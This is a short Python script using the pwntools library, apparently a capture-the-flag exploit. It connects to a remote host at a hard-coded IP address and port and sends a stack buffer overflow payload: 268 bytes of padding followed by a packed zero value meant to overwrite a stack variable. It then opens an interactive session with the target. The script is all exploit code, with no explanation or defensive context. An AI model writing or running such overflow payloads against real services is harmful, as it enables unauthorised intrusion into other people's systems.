from pwn import *

proc = remote("109.233.56.90", 11576)
proc.send(b"a"*(int("110", 16) - 4) + p32(0x0))
proc.interactive()
